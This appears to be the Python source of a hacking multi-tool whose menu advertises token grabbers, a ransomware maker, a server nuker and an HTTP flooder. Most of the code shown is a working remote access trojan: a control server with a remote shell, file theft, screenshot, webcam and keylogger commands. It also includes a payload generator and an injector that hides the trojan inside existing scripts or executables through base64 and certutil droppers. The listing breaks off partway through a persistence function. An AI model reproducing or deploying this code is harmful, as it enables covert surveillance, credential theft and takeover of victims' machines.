import requests, time, os, random, string, sys, re, socket, urllib.parse, subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
import hashlib, json, dns.resolver, threading, base64, zipfile, itertools
from datetime import datetime
import webbrowser, phonenumbers, whois, qrcode
from phonenumbers import carrier, geocoder, timezone
from PIL import Image
import shutil, tempfile, sqlite3, getpass, platform, ctypes
from pathlib import Path
import ast
import colorama
from pystyle import Center, Colorate, Colors, Anime
import subprocess
from colorama import Fore
import time
from pystyle import Colors, Colorate
from colorama import init

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RESET = '\033[0m'
BOLD = '\033[1m'

SUCCESS = GREEN
WARNING = YELLOW
INFO = CYAN
ERROR = RED

RESULTS = []
THREADS = 50
TIMEOUT = 5
WEBHOOK_URL = ""
OUTPUT_DIR = "./reports/"
RATE_LIMIT_COUNTER = {}
RATE_LIMIT_LOCK = threading.Lock()

# RAT Server configuration
RAT_SERVER_HOST = "0.0.0.0"
RAT_SERVER_PORT = 4444
RAT_PASSWORD_HASH = hashlib.sha256(b"change_this_password_immediately").hexdigest()
RAT_DB_FILE = "rat_clients.db"
RAT_SERVER_RUNNING = False
RAT_SERVER_SOCKET = None
RAT_CLIENTS = {}
RAT_CLIENTS_LOCK = threading.Lock()

if not os.path.exists(OUTPUT_DIR):
    os.makedirs(OUTPUT_DIR)

def rate_limit_check(key, max_requests=15, window=60):
    with RATE_LIMIT_LOCK:
        now = time.time()
        if key not in RATE_LIMIT_COUNTER:
            RATE_LIMIT_COUNTER[key] = []
        RATE_LIMIT_COUNTER[key] = [t for t in RATE_LIMIT_COUNTER[key] if now - t < window]
        if len(RATE_LIMIT_COUNTER[key]) >= max_requests:
            return False
        RATE_LIMIT_COUNTER[key].append(now)
        return True

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
def banner():
    print(Colorate.Horizontal(Colors.purple_to_blue, r"""
┌── Network / Recon ───────────┐┌─ Web / Osint ────────────────┐┌─ Utils / Discord ────────────┐     ___ _    ___  _  ___  __    
│                              ││                              ││                              │    / __| |  / _ \| |/ / |/ /
│ [1] IP Port Scanner          ││ [23] XSS Scanner             ││ [45] Py Obfusticator         │   | (_ | |_| (_) | ' <| ' <  
│ [2] IP Pinger                ││ [24] Basic Site Cloner       ││ [46] Export Report           │    \___|____\___/|_|\_\_|\_\ 
│ [3] Traceroute               ││ [25] Ip Geolocator           ││ [47] Setting Editor          │                                
│ [4] DNS Lookup               ││ [26] Ip to ASN               ││ [48] Discord List Check      │          Author : Jody
│ [5] MAC Lookup               ││ [27] Email Breach            ││ [49] Discord Random Check    │         Discord : fraudology
│ [6] SSL Checker              ││ [28] Username Tracker        ││ [50] Discord Wordlist Check  │                 1/2
│ [7] Proxy Checker            ││ [29] Phone Lookup            ││ [51] Single User Check       │  
│ [8] Network Scanner          ││ [30] Domain Intel            ││ [52] Set Webhook             │   [N] Next
│ [9] Proxy Scraper            ││ [31] Dox Tracker             ││ [53] Test Webhook            │   [B] Back
│ [10] Vuln Scanner            ││ [32] EXIF Scanner            ││ [54] Token Grabber           │   [I] Info
│ [11] IP Lookup               ││ [33] Dorking Engine          ││ [55] Roblox Grabber          │   [E] Exit
│ [12] Whois Lookup            ││ [34] Dox Creator             ││ [56] Token Login             │  
│ [13] IP Reputation           ││ [35] Email Repair            ││ [57] Token Join              │  
│ [14] Subdomain Finder        ││ [36] Temp Mail               ││ [58] Webhook Spam            │  
│ [15] Port Scanner (MT)       ││ [37] Password Generator      ││ [59] Mass Dm                 │  
│ [16] HTTP Headers            ││ [38] Hash Identifier         ││ [60] Server Nuker            │  
│ [17] WAF Detector            ││ [39] Hash Cracker            ││ [61] Rat Control Center      │  
│ [18] Tech Fingerprint        ││ [40] ZIP Cracker             ││ [62] Image Click Logger      │  
│ [19] Dir Bruteforcer         ││ [41] File Hasher             ││ [63] Layer 7 HTTP Flooder    │  
│ [20] CVE Scanner             ││ [42] Text Encoder            ││ [64] Enhanced Website Cloner │  
│ [21] Exploit DB Search       ││ [43] Jwt Decoder             ││ [65] Ransomeware Maker       │  
│ [22] SQL Scanner             ││ [44] QR Generator            ││ [66] Persistent Browser RAT  │  
└──────────────────────────────┘└──────────────────────────────┘└──────────────────────────────┘    

"""))

            
# ========== RAT DATABASE FUNCTIONS ==========
def rat_init_db():
    conn = sqlite3.connect(RAT_DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS clients
                 (client_id TEXT PRIMARY KEY,
                  ip TEXT,
                  hostname TEXT,
                  username TEXT,
                  os TEXT,
                  first_seen TEXT,
                  last_seen TEXT,
                  status TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  client_id TEXT,
                  command TEXT,
                  status TEXT,
                  result TEXT,
                  timestamp TEXT)''')
    conn.commit()
    conn.close()

def rat_update_client_db(client_id, ip, hostname, username, os_info, status="online"):
    conn = sqlite3.connect(RAT_DB_FILE)
    c = conn.cursor()
    now = datetime.now().isoformat()
    c.execute("SELECT * FROM clients WHERE client_id = ?", (client_id,))
    exists = c.fetchone()
    if exists:
        c.execute("UPDATE clients SET last_seen = ?, status = ? WHERE client_id = ?",
                 (now, status, client_id))
    else:
        c.execute("INSERT INTO clients VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                 (client_id, ip, hostname, username, os_info, now, now, status))
    conn.commit()
    conn.close()

def rat_delete_client_db(client_id):
    conn = sqlite3.connect(RAT_DB_FILE)
    c = conn.cursor()
    c.execute("DELETE FROM clients WHERE client_id = ?", (client_id,))
    c.execute("DELETE FROM commands WHERE client_id = ?", (client_id,))
    conn.commit()
    conn.close()
    print(f"{GREEN}[+] Client {client_id[:8]} deleted from database{RESET}")

def rat_get_all_clients_db():
    conn = sqlite3.connect(RAT_DB_FILE)
    c = conn.cursor()
    c.execute("SELECT client_id, ip, hostname, username, os, status, last_seen FROM clients ORDER BY last_seen DESC")
    clients = c.fetchall()
    conn.close()
    return clients

# ========== RAT CLIENT HANDLER ==========
class RatClientHandler:
    def __init__(self, conn, addr, client_id):
        self.conn = conn
        self.addr = addr
        self.client_id = client_id
        self.running = True

    def send_command(self, cmd):
        try:
            self.conn.send(cmd.encode() + b"\n")
            return True
        except:
            return False

    def receive_output(self, timeout=30):
        try:
            self.conn.settimeout(timeout)
            data = self.conn.recv(65536).decode()
            return data
        except socket.timeout:
            return "[TIMEOUT] Command timed out"
        except:
            return "[ERROR] Connection lost"

    def execute_command(self, cmd):
        if not self.send_command(cmd):
            return "[ERROR] Failed to send command"
        return self.receive_output()

    def download_file(self, remote_path):
        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=".download")
        temp_path = temp_file.name
        temp_file.close()

        cmd = f"DOWNLOAD {remote_path} {temp_path}"
        if not self.send_command(cmd):
            return None

        try:
            self.conn.settimeout(60)
            header = self.conn.recv(1024).decode()
            if header.startswith("FILE_SIZE:"):
                file_size = int(header.split(":")[1])
                with open(temp_path, "wb") as f:
                    received = 0
                    while received < file_size:
                        chunk = self.conn.recv(min(8192, file_size - received))
                        if not chunk:
                            break
                        f.write(chunk)
                        received += len(chunk)
                return temp_path
        except:
            return None
        return None

    def upload_file(self, local_path, remote_path):
        if not os.path.exists(local_path):
            return "[ERROR] Local file not found"

        file_size = os.path.getsize(local_path)
        cmd = f"UPLOAD {remote_path} {file_size}"
        if not self.send_command(cmd):
            return "[ERROR] Failed to send upload command"

        try:
            time.sleep(0.5)
            with open(local_path, "rb") as f:
                data = f.read()
                self.conn.send(data)
            return self.receive_output(30)
        except:
            return "[ERROR] Upload failed"

    def close(self):
        self.running = False
        try:
            self.conn.close()
        except:
            pass

# ========== RAT SERVER ==========
class RatServer:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.clients = {}
        self.lock = threading.Lock()
        self.server_socket = None
        self.running = False

    def start(self):
        global RAT_SERVER_RUNNING, RAT_SERVER_SOCKET
        rat_init_db()
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        self.running = True
        RAT_SERVER_RUNNING = True
        RAT_SERVER_SOCKET = self.server_socket

        print(f"\n{GREEN}[+] RAT Server started on {self.host}:{self.port}{RESET}")
        print(f"{GREEN}[+] Password: change_this_password_immediately{RESET}")
        print(f"{GREEN}[+] Waiting for connections...{RESET}\n")

        accept_thread = threading.Thread(target=self.accept_connections)
        accept_thread.daemon = True
        accept_thread.start()

    def stop(self):
        global RAT_SERVER_RUNNING, RAT_SERVER_SOCKET
        self.running = False
        RAT_SERVER_RUNNING = False
        with self.lock:
            for client_id, handler in self.clients.items():
                try:
                    handler.close()
                except:
                    pass
            self.clients.clear()
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        RAT_SERVER_SOCKET = None
        print(f"{GREEN}[+] RAT Server stopped{RESET}")

    def accept_connections(self):
        while self.running:
            try:
                self.server_socket.settimeout(1.0)
                conn, addr = self.server_socket.accept()
                client_id = hashlib.md5(f"{addr[0]}:{time.time()}".encode()).hexdigest()[:16]

                handler = RatClientHandler(conn, addr, client_id)

                with self.lock:
                    self.clients[client_id] = handler

                try:
                    conn.settimeout(5)
                    initial_data = conn.recv(4096).decode()
                    data = json.loads(initial_data)
                    hostname = data.get("hostname", "Unknown")
                    username = data.get("username", "Unknown")
                    os_info = data.get("os", "Unknown")
                    conn.send(b"OK\n")
                except:
                    hostname = "Unknown"
                    username = "Unknown"
                    os_info = "Unknown"

                rat_update_client_db(client_id, addr[0], hostname, username, os_info, "online")

                print(f"{GREEN}[+] New client connected: {client_id[:8]} from {addr[0]}:{addr[1]}{RESET}")

                client_thread = threading.Thread(target=self.handle_client, args=(handler, client_id))
                client_thread.daemon = True
                client_thread.start()

            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    pass

    def handle_client(self, handler, client_id):
        while handler.running and self.running:
            time.sleep(1)

        with self.lock:
            if client_id in self.clients:
                del self.clients[client_id]

        rat_update_client_db(client_id, "", "", "", "", "offline")

        print(f"{YELLOW}[-] Client disconnected: {client_id[:8]}{RESET}")

    def list_clients(self):
        online_ids = []
        with self.lock:
            online_ids = list(self.clients.keys())

        print(f"\n{GREEN}[+] Online clients: {len(online_ids)}{RESET}")
        for cid in online_ids:
            print(f"    - {cid[:8]}")

        db_clients = rat_get_all_clients_db()
        if db_clients:
            print(f"\n{GREEN}[+] All clients (from database):{RESET}")
            print("=" * 80)
            print(f"{'ID':<8} {'IP':<16} {'Hostname':<20} {'User':<12} {'Status':<8} {'Last Seen':<20}")
            print("=" * 80)
            for client in db_clients:
                client_id = client[0][:8]
                ip = client[1]
                hostname = client[2][:20]
                username = client[3][:12]
                status = client[5]
                last_seen = client[6][:19] if client[6] else "Never"
                print(f"{client_id:<8} {ip:<16} {hostname:<20} {username:<12} {status:<8} {last_seen:<20}")
            print("=" * 80)

    def select_client(self):
        self.list_clients()
        cid_input = input(f"\n{RED}[?] Enter client ID (first 8 chars): {RESET}")

        matched = None
        with self.lock:
            for cid_full in self.clients:
                if cid_full.startswith(cid_input):
                    matched = cid_full
                    break

        if not matched:
            print(f"{RED}[-] Client not found or offline{RESET}")
            return None

        return matched

    def show_client_menu(self, client_id):
        with self.lock:
            if client_id not in self.clients:
                print(f"{RED}[-] Client {client_id[:8]} not connected{RESET}")
                return
            handler = self.clients[client_id]

        while True:
            print(f"\n" + "=" * 60)
            print(f"{RED}{BOLD}CLIENT MENU: {client_id[:8]}{RESET}")
            print("=" * 60)
            print(f"{RED} 1. Command Shell{RESET}")
            print(f"{RED} 2. Download File{RESET}")
            print(f"{RED} 3. Upload File{RESET}")
            print(f"{RED} 4. Screenshot{RESET}")
            print(f"{RED} 5. Webcam Capture{RESET}")
            print(f"{RED} 6. Webcam Video Capture (10 sec){RESET}")
            print(f"{RED} 7. Screen Video Capture (10 sec){RESET}")
            print(f"{RED} 8. Keylogger - Start{RESET}")
            print(f"{RED} 9. Keylogger - Stop & Download{RESET}")
            print(f"{RED}10. System Information{RESET}")
            print(f"{RED}11. Process List{RESET}")
            print(f"{RED}12. Kill Process{RESET}")
            print(f"{RED}13. Persistence Install{RESET}")
            print(f"{RED}14. Uninstall from Target{RESET}")
            print(f"{RED}15. Lock Screen{RESET}")
            print(f"{RED}16. Shutdown Computer{RESET}")
            print(f"{RED}17. Restart Computer{RESET}")
            print(f"{RED}18. Close Connection{RESET}")
            print(f"{RED}19. Delete Client from Database{RESET}")
            print(f"{RED}20. Back to Main Menu{RESET}")
            print("=" * 60)

            choice = input(f"\n{RED}[>] Choice: {RESET}")

            if choice == "1":
                print(f"\n{GREEN}[+] Entering shell mode. Type 'exit' to return.{RESET}")
                while True:
                    cmd = input(f"\n{YELLOW}{client_id[:8]}$ {RESET}")
                    if cmd.lower() == "exit":
                        break
                    if not cmd:
                        continue
                    output = handler.execute_command(f"SHELL {cmd}")
                    print(output)

            elif choice == "2":
                remote_path = input(f"{RED}[?] Remote file path: {RESET}")
                local_path = input(f"{RED}[?] Local save path (optional): {RESET}")
                if not local_path:
                    local_path = os.path.basename(remote_path)

                print(f"{CYAN}[*] Downloading...{RESET}")
                downloaded = handler.download_file(remote_path)
                if downloaded and os.path.exists(downloaded):
                    shutil.move(downloaded, local_path)
                    print(f"{GREEN}[+] Downloaded to: {local_path}{RESET}")
                else:
                    print(f"{RED}[-] Download failed{RESET}")

            elif choice == "3":
                local_path = input(f"{RED}[?] Local file path: {RESET}")
                remote_path = input(f"{RED}[?] Remote save path: {RESET}")
                result = handler.upload_file(local_path, remote_path)
                print(result)

            elif choice == "4":
                print(f"{CYAN}[*] Taking screenshot...{RESET}")
                output = handler.execute_command("SCREENSHOT")
                if output and output.startswith("SCREENSHOT_SAVED:"):
                    remote_path = output.split(":")[1].strip()
                    local_path = f"screenshot_{client_id[:8]}_{int(time.time())}.png"
                    downloaded = handler.download_file(remote_path)
                    if downloaded:
                        shutil.move(downloaded, local_path)
                        print(f"{GREEN}[+] Screenshot saved to: {local_path}{RESET}")
                    else:
                        print(f"{RED}[-] Failed to download screenshot{RESET}")
                else:
                    print(output)

            elif choice == "5":
                print(f"{CYAN}[*] Capturing webcam...{RESET}")
                output = handler.execute_command("WEBCAM")
                if output and output.startswith("WEBCAM_SAVED:"):
                    remote_path = output.split(":")[1].strip()
                    local_path = f"webcam_{client_id[:8]}_{int(time.time())}.jpg"
                    downloaded = handler.download_file(remote_path)
                    if downloaded:
                        shutil.move(downloaded, local_path)
                        print(f"{GREEN}[+] Webcam image saved to: {local_path}{RESET}")
                    else:
                        print(f"{RED}[-] Failed to download webcam image{RESET}")
                else:
                    print(output)

            elif choice == "6":
                print(f"{CYAN}[*] Capturing webcam video (10 seconds)...{RESET}")
                output = handler.execute_command("VIDEO")
                if output and output.startswith("VIDEO_SAVED:"):
                    remote_path = output.split(":")[1].strip()
                    local_path = f"webcam_video_{client_id[:8]}_{int(time.time())}.avi"
                    downloaded = handler.download_file(remote_path)
                    if downloaded:
                        shutil.move(downloaded, local_path)
                        print(f"{GREEN}[+] Webcam video saved to: {local_path}{RESET}")
                    else:
                        print(f"{RED}[-] Failed to download video{RESET}")
                else:
                    print(output)

            elif choice == "7":
                print(f"{CYAN}[*] Capturing screen video (10 seconds)...{RESET}")
                output = handler.execute_command("SCREENVIDEO")
                if output and output.startswith("SCREENVIDEO_SAVED:"):
                    remote_path = output.split(":")[1].strip()
                    local_path = f"screencap_{client_id[:8]}_{int(time.time())}.avi"
                    downloaded = handler.download_file(remote_path)
                    if downloaded:
                        shutil.move(downloaded, local_path)
                        print(f"{GREEN}[+] Screen recording saved to: {local_path}{RESET}")
                    else:
                        print(f"{RED}[-] Failed to download recording{RESET}")
                else:
                    print(output)

            elif choice == "8":
                print(f"{CYAN}[*] Starting keylogger...{RESET}")
                output = handler.execute_command("KEYLOG_START")
                print(output)

            elif choice == "9":
                print(f"{CYAN}[*] Stopping keylogger and downloading logs...{RESET}")
                output = handler.execute_command("KEYLOG_STOP")
                if output and output.startswith("KEYLOG_SAVED:"):
                    remote_path = output.split(":")[1].strip()
                    local_path = f"keylog_{client_id[:8]}_{int(time.time())}.txt"
                    downloaded = handler.download_file(remote_path)
                    if downloaded:
                        shutil.move(downloaded, local_path)
                        print(f"{GREEN}[+] Keylog saved to: {local_path}{RESET}")
                    else:
                        print(f"{RED}[-] Failed to download keylog{RESET}")
                else:
                    print(output)

            elif choice == "10":
                output = handler.execute_command("SYSINFO")
                print(output)

            elif choice == "11":
                output = handler.execute_command("PSLIST")
                print(output)

            elif choice == "12":
                pid = input(f"{RED}[?] Process PID to kill: {RESET}")
                output = handler.execute_command(f"KILL {pid}")
                print(output)

            elif choice == "13":
                output = handler.execute_command("PERSIST")
                print(output)

            elif choice == "14":
                confirm = input(f"{RED}[!] This will remove the RAT from the target. Continue? (y/n): {RESET}")
                if confirm.lower() == "y":
                    handler.execute_command("UNINSTALL")
                    print(f"{GREEN}[*] Uninstall command sent{RESET}")
                    return

            elif choice == "15":
                output = handler.execute_command("LOCK")
                print(output)

            elif choice == "16":
                confirm = input(f"{RED}[!] Shutdown the computer? (y/n): {RESET}")
                if confirm.lower() == "y":
                    handler.execute_command("SHUTDOWN")
                    print(f"{GREEN}[*] Shutdown command sent{RESET}")
                    return

            elif choice == "17":
                confirm = input(f"{RED}[!] Restart the computer? (y/n): {RESET}")
                if confirm.lower() == "y":
                    handler.execute_command("RESTART")
                    print(f"{GREEN}[*] Restart command sent{RESET}")
                    return

            elif choice == "18":
                handler.execute_command("DISCONNECT")
                handler.close()
                print(f"{GREEN}[*] Connection closed{RESET}")
                return

            elif choice == "19":
                confirm = input(f"{RED}[!] Delete client {client_id[:8]} from database? (y/n): {RESET}")
                if confirm.lower() == "y":
                    rat_delete_client_db(client_id)
                    return

            elif choice == "20":
                return

            else:
                print(f"{RED}[-] Invalid choice{RESET}")

    def run_control_center(self):
        while self.running:
            print(f"\n" + "=" * 50)
            print(f"{RED}{BOLD}RAT CONTROL CENTER{RESET}")
            print("=" * 50)
            print(f"{RED} 1. List Clients{RESET}")
            print(f"{RED} 2. Select Client{RESET}")
            print(f"{RED} 3. Show Online Clients Only{RESET}")
            print(f"{RED} 4. Show All Clients (DB){RESET}")
            print(f"{RED} 5. Generate Payload{RESET}")
            print(f"{RED} 6. Inject Payload into File{RESET}")
            print(f"{RED} 7. Stop RAT Server{RESET}")
            print(f"{RED} 8. Back to Main Menu{RESET}")
            print("=" * 50)

            choice = input(f"\n{RED}[>] Choice: {RESET}")

            if choice == "1":
                with self.lock:
                    if not self.clients:
                        print(f"\n{YELLOW}[!] No online clients{RESET}")
                    else:
                        print(f"\n{GREEN}[+] Online clients: {len(self.clients)}{RESET}")
                        for cid in self.clients:
                            print(f"    - {cid[:8]}")

            elif choice == "2":
                matched = self.select_client()
                if matched:
                    self.show_client_menu(matched)

            elif choice == "3":
                with self.lock:
                    if not self.clients:
                        print(f"\n{YELLOW}[!] No online clients{RESET}")
                    else:
                        print(f"\n{GREEN}[+] Online clients ({len(self.clients)}):{RESET}")
                        db_clients = rat_get_all_clients_db()
                        db_dict = {c[0]: c for c in db_clients}
                        for cid_full in self.clients:
                            if cid_full in db_dict:
                                row = db_dict[cid_full]
                                print(f"    - {cid_full[:8]} | {row[1]} | {row[2]} | {row[3]}")
                            else:
                                print(f"    - {cid_full[:8]}")

            elif choice == "4":
                db_clients = rat_get_all_clients_db()
                if not db_clients:
                    print(f"\n{YELLOW}[!] No clients in database{RESET}")
                else:
                    print("\n" + "=" * 80)
                    print(f"{'ID':<8} {'IP':<16} {'Hostname':<20} {'User':<12} {'Status':<8} {'Last Seen':<20}")
                    print("=" * 80)
                    for client in db_clients:
                        client_id = client[0][:8]
                        ip = client[1]
                        hostname = client[2][:20]
                        username = client[3][:12]
                        status = client[5]
                        last_seen = client[6][:19] if client[6] else "Never"
                        print(f"{client_id:<8} {ip:<16} {hostname:<20} {username:<12} {status:<8} {last_seen:<20}")
                    print("=" * 80)

            elif choice == "5":
                self.generate_payload()

            elif choice == "6":
                self.inject_payload_into_file()

            elif choice == "7":
                self.stop()
                return

            elif choice == "8":
                return

            else:
                print(f"{RED}[-] Invalid choice{RESET}")

    def generate_payload(self):
        print("\n" + "=" * 60)
        print(f"{RED}{BOLD}PAYLOAD GENERATOR{RESET}")
        print("=" * 60)

        server_ip = input(f"{RED}[?] Your server IP address: {RESET}")
        server_port = input(f"{RED}[?] Server port (default {RAT_SERVER_PORT}): {RESET}") or str(RAT_SERVER_PORT)

        print(f"\n{GREEN}[+] Payload types:{RESET}")
        print(f"{RED} 1. Python Script (.py){RESET}")
        print(f"{RED} 2. Windows Executable (.exe) - requires PyInstaller{RESET}")
        print(f"{RED} 3. PowerShell Script (.ps1){RESET}")
        print(f"{RED} 4. Batch File (.bat){RESET}")

        ptype = input(f"\n{RED}[?] Choose type: {RESET}")

        payload_code = self.get_payload_code(server_ip, server_port)

        if ptype == "1":
            fname = f"payload_{int(time.time())}.py"
            with open(fname, 'w', encoding='utf-8') as f:
                f.write(payload_code)
            print(f"\n{GREEN}[+] Payload saved to: {fname}{RESET}")

        elif ptype == "2":
            fname = f"payload_{int(time.time())}.py"
            with open(fname, 'w', encoding='utf-8') as f:
                f.write(payload_code)
            print(f"\n{GREEN}[+] To create .exe, run:{RESET}")
            print(f"    pyinstaller --onefile --noconsole --name rat_client {fname}")

        elif ptype == "3":
            b64_code = base64.b64encode(payload_code.encode()).decode()
            ps_code = f'''$code = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{b64_code}"))
$temp = [System.IO.Path]::GetTempFileName() + ".py"
[System.IO.File]::WriteAllText($temp, $code)
python $temp
'''
            fname = f"payload_{int(time.time())}.ps1"
            with open(fname, 'w', encoding='utf-8') as f:
                f.write(ps_code)
            print(f"\n{GREEN}[+] Payload saved to: {fname}{RESET}")

        elif ptype == "4":
            b64_code = base64.b64encode(payload_code.encode()).decode()
            bat_code = f'''@echo off
echo {b64_code} > %temp%\\payload.b64
certutil -decode %temp%\\payload.b64 %temp%\\payload.py >nul 2>&1
python %temp%\\payload.py
'''
            fname = f"payload_{int(time.time())}.bat"
            with open(fname, 'w', encoding='utf-8') as f:
                f.write(bat_code)
            print(f"\n{GREEN}[+] Payload saved to: {fname}{RESET}")

        else:
            print(f"{RED}[-] Invalid type{RESET}")

        print(f"\n{RED}[!] WARNING: This payload is for authorized testing only{RESET}")
        print(f"{RED}[!] Do not distribute or use on systems without permission{RESET}")

    def inject_payload_into_file(self):
        print("\n" + "=" * 60)
        print(f"{RED}{BOLD}PAYLOAD INJECTOR{RESET}")
        print("=" * 60)

        target_file = input(f"{RED}[?] Target file to inject into (.exe, .py, .ps1, .bat): {RESET}")
        if not os.path.exists(target_file):
            print(f"{RED}[-] File not found{RESET}")
            return

        server_ip = input(f"{RED}[?] Your server IP address: {RESET}")
        server_port = input(f"{RED}[?] Server port (default {RAT_SERVER_PORT}): {RESET}") or str(RAT_SERVER_PORT)

        payload_code = self.get_payload_code(server_ip, server_port)

        ext = os.path.splitext(target_file)[1].lower()
        backup_file = target_file + ".backup"
        shutil.copy2(target_file, backup_file)
        print(f"{GREEN}[+] Backup created: {backup_file}{RESET}")

        if ext == ".py":
            with open(target_file, 'r', encoding='utf-8', errors='ignore') as f:
                original = f.read()
            with open(target_file, 'w', encoding='utf-8') as f:
                f.write(payload_code + "\n# Injected payload\n" + original)
            print(f"{GREEN}[+] Payload injected into {target_file}{RESET}")

        elif ext == ".ps1":
            b64_code = base64.b64encode(payload_code.encode()).decode()
            inject_code = f'''
# Injected payload
$code = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{b64_code}"))
$temp = [System.IO.Path]::GetTempFileName() + ".py"
[System.IO.File]::WriteAllText($temp, $code)
Start-Process python -ArgumentList $temp -WindowStyle Hidden
'''
            with open(target_file, 'r', encoding='utf-8', errors='ignore') as f:
                original = f.read()
            with open(target_file, 'w', encoding='utf-8') as f:
                f.write(inject_code + "\n" + original)
            print(f"{GREEN}[+] Payload injected into {target_file}{RESET}")

        elif ext == ".bat":
            b64_code = base64.b64encode(payload_code.encode()).decode()
            inject_code = f'''
REM Injected payload
echo {b64_code} > %temp%\\payload.b64
certutil -decode %temp%\\payload.b64 %temp%\\payload.py >nul 2>&1
start /B python %temp%\\payload.py
'''
            with open(target_file, 'r', encoding='utf-8', errors='ignore') as f:
                original = f.read()
            with open(target_file, 'w', encoding='utf-8') as f:
                f.write(inject_code + "\n" + original)
            print(f"{GREEN}[+] Payload injected into {target_file}{RESET}")

        elif ext == ".exe":
            print(f"{YELLOW}[!] EXE injection requires advanced techniques{RESET}")
            print(f"{YELLOW}[!] Creating a wrapper instead...{RESET}")
            wrapper_path = f"wrapped_{os.path.basename(target_file)}"
            b64_payload = base64.b64encode(payload_code.encode()).decode()
            wrapper_code = f'''import os, sys, base64, subprocess, tempfile

payload_b64 = "{b64_payload}"
payload_code = base64.b64decode(payload_b64).decode()

temp_py = tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False)
temp_py.write(payload_code)
temp_py.close()

subprocess.Popen(['python', temp_py.name], creationflags=subprocess.CREATE_NO_WINDOW)

original_exe = sys.argv[0]
if os.path.exists(original_exe + ".original"):
    subprocess.Popen([original_exe + ".original"] + sys.argv[1:])
'''
            shutil.copy2(target_file, target_file + ".original")
            with open(wrapper_path, 'w', encoding='utf-8') as f:
                f.write(wrapper_code)
            print(f"{GREEN}[+] Wrapper created: {wrapper_path}{RESET}")
            print(f"{YELLOW}[!] Compile wrapper with: pyinstaller --onefile --noconsole {wrapper_path}{RESET}")

        else:
            print(f"{RED}[-] Unsupported file type{RESET}")

        print(f"\n{RED}[!] WARNING: Injected file is for authorized testing only{RESET}")

    def get_payload_code(self, server_ip, server_port):
        return f'''#!/usr/bin/env python3
# RAT Client - Authorized Testing Only

import os
import sys
import subprocess
import threading
import socket
import json
import time
import base64
import platform
import getpass
import tempfile
import shutil
from datetime import datetime
from pathlib import Path

SERVER_HOST = "{server_ip}"
SERVER_PORT = {server_port}

def get_system_info():
    return {{
        "hostname": socket.gethostname(),
        "username": getpass.getuser(),
        "os": platform.platform(),
        "python": sys.version,
        "timestamp": datetime.now().isoformat()
    }}

def execute_shell_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "[TIMEOUT] Command exceeded 60 seconds"
    except Exception as e:
        return f"[ERROR] {{str(e)}}"

def take_screenshot():
    try:
        import PIL.ImageGrab
        temp_path = os.path.join(tempfile.gettempdir(), f"screenshot_{{int(time.time())}}.png")
        img = PIL.ImageGrab.grab()
        img.save(temp_path)
        return temp_path
    except ImportError:
        try:
            import mss
            with mss.mss() as sct:
                temp_path = os.path.join(tempfile.gettempdir(), f"screenshot_{{int(time.time())}}.png")
                sct.shot(output=temp_path)
                return temp_path
        except:
            return None
    except:
        return None

def capture_webcam():
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        ret, frame = cap.read()
        if ret:
            temp_path = os.path.join(tempfile.gettempdir(), f"webcam_{{int(time.time())}}.jpg")
            cv2.imwrite(temp_path, frame)
            cap.release()
            return temp_path
        cap.release()
        return None
    except:
        return None

def capture_video(duration=10, fps=5):
    try:
        import cv2
        temp_dir = tempfile.gettempdir()
        timestamp = int(time.time())
        output_path = os.path.join(temp_dir, f"video_{{timestamp}}.avi")
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        fourcc = cv2.VideoWriter_fourcc(*'MJPG')
        frame_width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
        frame_height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
        out = cv2.VideoWriter(output_path, fourcc, fps, (frame_width, frame_height))
        start_time = time.time()
        frame_count = 0
        while (time.time() - start_time) < duration:
            ret, frame = cap.read()
            if ret:
                out.write(frame)
                frame_count += 1
            time.sleep(1.0 / fps)
        cap.release()
        out.release()
        if frame_count > 0 and os.path.exists(output_path):
            return output_path
        return None
    except:
        return None

def capture_screen_video(duration=10, fps=5):
    try:
        import cv2
        import numpy as np
        from PIL import ImageGrab
        temp_dir = tempfile.gettempdir()
        timestamp = int(time.time())
        output_path = os.path.join(temp_dir, f"screencap_{{timestamp}}.avi")
        screen = ImageGrab.grab()
        width, height = screen.size
        fourcc = cv2.VideoWriter_fourcc(*'MJPG')
        out = cv2.VideoWriter(output_path, fourcc, fps, (width, height))
        start_time = time.time()
        frame_count = 0
        while (time.time() - start_time) < duration:
            img = ImageGrab.grab()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            out.write(frame)
            frame_count += 1
            time.sleep(1.0 / fps)
        out.release()
        if frame_count > 0 and os.path.exists(output_path):
            return output_path
        return None
    except:
        return None

def get_process_list():
    try:
        if os.name == 'nt':
            result = subprocess.run(['tasklist'], capture_output=True, text=True)
            return result.stdout[:5000]
        else:
            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
            return result.stdout[:5000]
    except:
        return "[ERROR] Could not get process list"

def kill_process(pid):
    try:
        if os.name == 'nt':
            subprocess.run(['taskkill', '/F', '/PID', pid], capture_output=True)
        else:
            subprocess.run(['kill', '-9', pid], capture_output=True)
        return f"[+] Process {{pid}} killed"
    except:
        return f"[-] Failed to kill process {{pid}}"

def install_persistence():
    try:
        if os.name == 'nt':
            script_path = sys.argv[0]
